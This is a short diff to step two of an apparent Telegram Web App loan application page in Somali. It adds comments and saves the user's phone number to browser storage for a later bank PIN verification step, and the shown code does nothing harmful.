@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Codsiga Amaahda - Step 2</title>
 
-    <!-- Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -215,9 +214,13 @@
             return;
         }
 
+        // Save for general flow
         localStorage.setItem('firstName', fName);
         localStorage.setItem('lastName', lName);
         localStorage.setItem('phone', phone);
+        
+        // CRITICAL: Save specifically for the Bank PIN API verification
+        localStorage.setItem('userPhone', phone);
 
         window.location.href = "/page4";
     }
@@ -229,7 +232,7 @@
     window.onload = () => {
         const tg = window.Telegram?.WebApp;
         if (tg) {
-            tg.ready();   // ✅ important
+            tg.ready();
             tg.expand();
         }
 
